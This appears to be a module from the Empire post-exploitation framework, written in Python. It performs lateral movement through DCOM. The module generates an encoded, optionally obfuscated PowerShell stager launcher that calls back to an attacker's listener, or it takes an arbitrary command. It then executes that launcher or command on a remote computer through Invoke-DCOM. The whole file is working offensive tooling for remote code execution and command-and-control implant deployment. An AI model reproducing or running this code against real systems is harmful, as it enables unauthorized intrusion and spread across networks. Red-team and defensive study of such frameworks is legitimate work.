from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        command = params["Command"]
        method = params["Method"]
        computer_name = params["ComputerName"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        # Only "Command" or "Listener" but not both
        if listener_name == "" and command == "":
            raise ModuleValidationException("Listener or Command required")
        if listener_name and command:
            raise ModuleValidationException(
                "[!] Cannot use Listener and Command at the same time"
            )

        script_end = ""

        if (
            not main_menu.listenersv2.get_active_listener_by_name(listener_name)
            and not command
        ):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException("Invalid listener: " + listener_name)

        if listener_name:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=params["Bypasses"],
            )

            if launcher == "":
                raise ModuleValidationException("Error in launcher generation.")

            Cmd = (
                "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
                + launcher
            )

        else:
            Cmd = "%COMSPEC% /C start /b " + command.replace('"', '\\"')

        script_end = f"Invoke-DCOM -ComputerName {computer_name} -Method {method} -Command '{Cmd}'"

        return script, script_end
